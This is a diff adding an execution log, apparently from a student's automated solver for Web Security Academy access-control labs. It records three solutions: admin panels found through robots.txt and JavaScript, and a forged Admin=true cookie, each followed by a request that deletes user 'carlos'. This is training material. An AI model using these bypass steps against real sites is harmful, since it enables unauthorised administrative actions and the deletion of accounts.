@@ -1,0 +1,34 @@
+[2026-10-27 14:46:52] Processamento encerrado. Itens examinados: 0
+[2026-10-27 14:46:52] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 14:46:52] Verifique na Academy todos os itens com status 'verificar'.
+[2026-10-27 14:58:10] Laboratório: Lab: Unprotected admin functionality
+[2026-10-27 14:58:10] Script: Access Control\01-unprotected-admin-functionality.py
+[2026-10-27 14:58:10] Tentativa 1 de 1
+[2026-10-27 14:58:14] [+] robots.txt discloses: /administrator-panel
+[2026-10-27 14:58:14] [+] Admin panel found: https://0a4e008f0314eb3481d5b61e0008007e.web-security-academy.net/administrator-panel
+[2026-10-27 14:58:14] [*] Deleting carlos via: https://0a4e008f0314eb3481d5b61e0008007e.web-security-academy.net/administrator-panel/delete?username=carlos
+[2026-10-27 14:58:14] [+] Lab solved -- carlos deleted via unprotected admin panel.
+[2026-10-27 14:58:14] 
+[2026-10-27 14:58:14] Código de saída: 0
+[2026-10-27 14:58:14] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 14:58:14] Laboratório: Lab: Unprotected admin functionality with unpredictable URL
+[2026-10-27 14:58:14] Script: Access Control\02-unprotected-admin-functionality-unpredictable-url.py
+[2026-10-27 14:58:14] Tentativa 1 de 1
+[2026-10-27 14:58:19] [+] Found admin URL in JS: /admin-4mt1ab
+[2026-10-27 14:58:19] [*] Deleting carlos via: https://0af4009003b268d781c95709001c001c.web-security-academy.net/admin-4mt1ab/delete?username=carlos
+[2026-10-27 14:58:19] [+] Lab solved -- carlos deleted via JS-disclosed admin panel.
+[2026-10-27 14:58:19] 
+[2026-10-27 14:58:19] Código de saída: 0
+[2026-10-27 14:58:19] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 14:58:19] Laboratório: Lab: User role controlled by request parameter
+[2026-10-27 14:58:19] Script: Access Control\03-user-role-controlled-by-request-parameter.py
+[2026-10-27 14:58:19] Tentativa 1 de 1
+[2026-10-27 14:58:27] [*] /admin with Admin=true cookie: 200
+[2026-10-27 14:58:27] [*] Deleting carlos via: https://0a1f00c60334d8bd8109f78700ff00a5.web-security-academy.net/admin/delete?username=carlos
+[2026-10-27 14:58:27] [+] Lab solved -- carlos deleted after forging Admin=true cookie.
+[2026-10-27 14:58:27] 
+[2026-10-27 14:58:27] Código de saída: 0
+[2026-10-27 14:58:27] Confirme manualmente se a Academy marcou o laboratório como resolvido.
+[2026-10-27 14:58:27] Processamento encerrado. Itens examinados: 3
+[2026-10-27 14:58:27] Histórico: C:\Users\Aluno\Desktop\web-security-academy-solutions\04-reports\executor.log
+[2026-10-27 14:58:27] Verifique na Academy todos os itens com status 'verificar'.
